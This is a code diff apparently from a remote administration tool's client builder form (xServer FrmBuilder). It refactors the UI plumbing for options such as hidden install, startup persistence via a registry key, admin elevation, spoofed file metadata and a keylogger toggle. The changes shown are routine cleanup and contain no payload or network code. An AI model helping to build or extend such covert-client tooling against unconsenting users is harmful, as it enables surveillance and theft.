@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 using xServer.Core.Build;
@@ -10,7 +11,7 @@ namespace xServer.Forms
 {
     public partial class FrmBuilder : Form
     {
-        private bool _loadedProfile;
+        private bool _profileLoaded;
         private bool _changed;
 
         public FrmBuilder()
@@ -20,8 +21,20 @@ namespace xServer.Forms
 
         private void HasChanged()
         {
-            if (_loadedProfile && !_changed)
+            if (!_changed && _profileLoaded)
                 _changed = true;
+        }
+
+        private void UpdateControlStates()
+        {
+            txtInstallname.Enabled = chkInstall.Checked;
+            rbAppdata.Enabled = chkInstall.Checked;
+            rbProgramFiles.Enabled = chkInstall.Checked;
+            rbSystem.Enabled = chkInstall.Checked;
+            txtInstallsub.Enabled = chkInstall.Checked;
+            chkHide.Enabled = chkInstall.Checked;
+            chkStartup.Enabled = chkInstall.Checked;
+            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
         }
 
         private void LoadProfile(string profilename)
@@ -32,19 +45,17 @@ namespace xServer.Forms
             txtPassword.Text = pm.ReadValue("Password");
             txtDelay.Text = pm.ReadValue("Delay");
             txtMutex.Text = pm.ReadValue("Mutex");
-            chkInstall.Checked = bool.Parse(pm.ReadValue("InstallClient"));
+            chkInstall.Checked = bool.Parse(pm.ReadValueSafe("InstallClient", "False"));
             txtInstallname.Text = pm.ReadValue("InstallName");
             GetInstallPath(int.Parse(pm.ReadValue("InstallPath"))).Checked = true;
             txtInstallsub.Text = pm.ReadValue("InstallSub");
-            chkHide.Checked = bool.Parse(pm.ReadValue("HideFile"));
-            chkStartup.Checked = bool.Parse(pm.ReadValue("AddStartup"));
+            chkHide.Checked = bool.Parse(pm.ReadValueSafe("HideFile", "False"));
+            chkStartup.Checked = bool.Parse(pm.ReadValueSafe("AddStartup", "False"));
             txtRegistryKeyName.Text = pm.ReadValue("RegistryName");
-            chkElevation.Checked = bool.Parse(pm.ReadValue("AdminElevation"));
-            chkIconChange.Checked = bool.Parse(pm.ReadValue("ChangeIcon"));
-            chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValue("ChangeAsmInfo"));
-            chkKeylogger.Checked =
-                bool.Parse(!string.IsNullOrEmpty(pm.ReadValue("Keylogger")) ? pm.ReadValue("Keylogger") : "False");
-                //fallback
+            chkElevation.Checked = bool.Parse(pm.ReadValueSafe("AdminElevation", "False"));
+            chkIconChange.Checked = bool.Parse(pm.ReadValueSafe("ChangeIcon", "False"));
+            chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValueSafe("ChangeAsmInfo", "False"));
+            chkKeylogger.Checked = bool.Parse(pm.ReadValueSafe("Keylogger", "False"));
             txtProductName.Text = pm.ReadValue("ProductName");
             txtDescription.Text = pm.ReadValue("Description");
             txtCompanyName.Text = pm.ReadValue("CompanyName");
@@ -53,7 +64,7 @@ namespace xServer.Forms
             txtOriginalFilename.Text = pm.ReadValue("OriginalFilename");
             txtProductVersion.Text = pm.ReadValue("ProductVersion");
             txtFileVersion.Text = pm.ReadValue("FileVersion");
-            _loadedProfile = true;
+            _profileLoaded = true;
         }
 
         private void SaveProfile(string profilename)
@@ -95,13 +106,7 @@ namespace xServer.Forms
                 txtMutex.Text = Helper.GetRandomName(32);
             }
 
-            txtInstallname.Enabled = chkInstall.Checked;
-            rbAppdata.Enabled = chkInstall.Checked;
-            rbProgramFiles.Enabled = chkInstall.Checked;
-            rbSystem.Enabled = chkInstall.Checked;
-            txtInstallsub.Enabled = chkInstall.Checked;
-            chkHide.Enabled = chkInstall.Checked;
-            chkStartup.Enabled = chkInstall.Checked;
+            UpdateControlStates();
 
             txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
 
@@ -131,22 +136,21 @@ namespace xServer.Forms
 
         private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
         {
-            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
-                e.Handled = true;
+            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
         }
 
         private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
         {
-            string illegal = new string(Path.GetInvalidPathChars()) + new string(Path.GetInvalidFileNameChars());
-            if ((e.KeyChar == '\\' || illegal.Contains(e.KeyChar.ToString())) && !char.IsControl(e.KeyChar))
-                e.Handled = true;
+            char[] illegal = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();
+
+            e.Handled = ((e.KeyChar == '\\' || illegal.Any(illegalChar => (illegalChar == e.KeyChar))) && !char.IsControl(e.KeyChar));
         }
 
         private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
         {
-            string illegal = new string(Path.GetInvalidPathChars()) + new string(Path.GetInvalidFileNameChars());
-            if ((e.KeyChar == '\\' || illegal.Contains(e.KeyChar.ToString())) && !char.IsControl(e.KeyChar))
-                e.Handled = true;
+            char[] illegal = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();
+
+            e.Handled = ((e.KeyChar == '\\' || illegal.Any(illegalChar => (illegalChar == e.KeyChar))) && !char.IsControl(e.KeyChar));
         }
 
         private void txtInstallname_TextChanged(object sender, EventArgs e)
@@ -195,14 +199,7 @@ namespace xServer.Forms
         {
             HasChanged();
 
-            txtInstallname.Enabled = chkInstall.Checked;
-            rbAppdata.Enabled = chkInstall.Checked;
-            rbProgramFiles.Enabled = chkInstall.Checked;
-            rbSystem.Enabled = chkInstall.Checked;
-            txtInstallsub.Enabled = chkInstall.Checked;
-            chkHide.Enabled = chkInstall.Checked;
-            chkStartup.Enabled = chkInstall.Checked;
-            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
+            UpdateControlStates();
         }
 
         private void chkStartup_CheckedChanged(object sender, EventArgs e)
@@ -269,7 +266,7 @@ namespace xServer.Forms
                 using (SaveFileDialog sfd = new SaveFileDialog())
                 {
                     sfd.Filter = "EXE Files *.exe|*.exe";
-                    sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                    sfd.RestoreDirectory = true;
                     sfd.FileName = "Client-built.exe";
                     if (sfd.ShowDialog() == DialogResult.OK)
                         output = sfd.FileName;
